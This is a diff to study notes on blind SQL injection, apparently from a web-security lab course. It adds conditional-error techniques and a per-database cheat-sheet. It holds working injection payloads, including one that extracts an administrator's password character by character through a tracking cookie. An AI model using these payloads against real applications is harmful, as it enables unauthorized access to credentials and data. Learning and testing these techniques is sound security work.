@@ -38,8 +38,8 @@ This query is vulnerable to SQL injection, but the results from the query are no
 
 suppose that two requests are sent containing the following TrackingId cookie values in turn this will help us determine the result 1 bit at a time:
 ```sql
-…xyz' AND '1'='1 --welcome back
-…xyz' AND '1'='2 --other responce
+…xyz' AND 1=1 --welcome back
+…xyz' AND 1=2 --other responce
 ```
 For example, suppose there is a table called `Users` with the columns `Username` and `Password`, and a user called `Administrator`. We can systematically determine the password for this user by sending a series of inputs to test the password one character at a time.
 
@@ -78,4 +78,33 @@ To be able to tell when the correct character was submitted, you'll need to grep
 then find the password by
 ```sql
 ' AND (SELECT SUBSTRING(password,§1§,1) FROM users WHERE username='administrator')='§a§'--
+```
+## inducing conditional responses by triggering SQL errors
+suppose instead that the application carries out the same SQL query, but does not behave any differently depending on whether the query returns any data. The preceding technique will not work, because injecting different Boolean conditions makes no difference to the application's responses.
+
+To see how this works, suppose that two requests are sent containing the following TrackingId cookie values in turn:
+```sql
+xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a'-- => true
+xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a'-- =>error
+```
+This SQL query is using a conditional expression in the form of a "CASE" statement to test if the value of the expression 1=2 is true or false. If the expression is true, the query returns the result of the division 1/0, which would result in a divide by zero error. If the expression is false, the query returns the string value 'a'.
+
+Finally, the result of the CASE statement is compared to the string 'a' using an equality comparison ='a'. If the result of the CASE statement is equal to 'a', the comparison will evaluate to true, otherwise it will evaluate to false.
+
+In this specific case, the expression 1=2 is false, so the result of the CASE statement will be 'a', and the comparison will evaluate to true.
+
+This type of query could potentially be used in a SQL injection attack, if the attacker has the ability to modify the SQL query being executed by the application. By injecting a value that changes the expression in the CASE statement, the attacker could alter the behavior of the query and potentially cause a security vulnerability.
+
+ With the second input, it evaluates to 1/0, which causes a divide-by-zero error. Assuming the error causes some difference in the application's HTTP response, we can use this difference to infer whether the injected condition is true.
+ 
+ ```sql
+ xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a'--
+ ```
+ ## Conditional errors
+You can test a single boolean condition and trigger a database error if the condition is true.
+```sql
+Oracle        SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual
+Microsoft     SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END
+PostgreSQL    1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN CAST(1/0 AS INTEGER) ELSE NULL END)
+MySQL         SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')
 ```
